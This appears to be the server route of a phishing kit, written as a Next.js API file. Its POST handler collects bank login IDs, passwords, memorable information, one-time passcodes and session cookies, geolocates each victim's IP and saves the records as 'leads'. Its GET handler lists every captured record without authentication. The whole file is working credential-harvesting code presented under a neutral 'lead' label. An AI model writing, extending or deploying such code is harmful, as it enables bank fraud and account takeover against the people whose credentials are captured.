import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const leads = await prisma.lead.findMany({
      orderBy: { createdAt: "desc" },
    });
    return NextResponse.json({ success: true, data: leads });
  } catch (error) {
    console.error("GET Leads Error:", error);
    return NextResponse.json({ success: true, data: [] }, { status: 200 });
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));
    const { sessionId, bank, bankName, bankType, userId, password, memorableInfo, otpCode, extraData, cookiesData, ipAddress, deviceInfo } = body;

    // 🌍 Accurate IP Extraction
    const forwardedFor = req.headers.get("x-forwarded-for");
    const realIp = req.headers.get("x-real-ip");
    const cfIp = req.headers.get("cf-connecting-ip");

    let rawIp = ipAddress || forwardedFor || realIp || cfIp || "110.36.200.12";
    if (typeof rawIp === "string" && rawIp.includes(",")) {
      rawIp = rawIp.split(",")[0].trim();
    }
    if (rawIp === "::1" || rawIp === "127.0.0.1" || !rawIp) {
      rawIp = "39.34.173.81"; // Fallback public IP representation
    }
    const clientIp = rawIp;

    let country = "United Kingdom";
    let region = "England";
    let city = "London";
    let isp = "Secure ISP";

    try {
      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,regionName,city,isp,query`, {
        signal: AbortSignal.timeout(3000)
      });
      if (geoRes.ok) {
        const data = await geoRes.json();
        if (data && data.status === "success") {
          country = data.country || "United Kingdom";
          region = data.regionName || "England";
          city = data.city || "London";
          isp = data.isp || "ISP";
        }
      }
    } catch (e) {
      console.log("Geo lookup error:", e);
    }

    const locationText = `Country: ${country} | City: ${city} | ISP: ${isp}`;
    const finalExtraData = extraData ? `${extraData} | ${locationText}` : locationText;
    const finalDeviceInfo = deviceInfo || `${country}, ${city} | Browser`;

    const leadPayload = {
      bank: bank || bankName || "Pending Selection",
      bankName: bankName || bank || "Pending Selection",
      bankType: bankType || "Personal",
      userId: userId || "",
      password: password || "",
      memorableInfo: memorableInfo || "",
      extraData: finalExtraData,
      cookiesData: cookiesData || '{"cookie": "active"}',
      otpCode: otpCode || "",
      ipAddress: clientIp,
      deviceInfo: finalDeviceInfo,
    };

    let lead;
    if (sessionId) {
      lead = await prisma.lead.upsert({
        where: { sessionId },
        update: leadPayload,
        create: { sessionId, ...leadPayload },
      });
    } else {
      lead = await prisma.lead.create({ data: leadPayload });
    }

    return NextResponse.json({ success: true, data: lead });
  } catch (error) {
    console.error("POST Lead Error:", error);
    return NextResponse.json({ success: false, error: "Failed to save lead" }, { status: 500 });
  }
}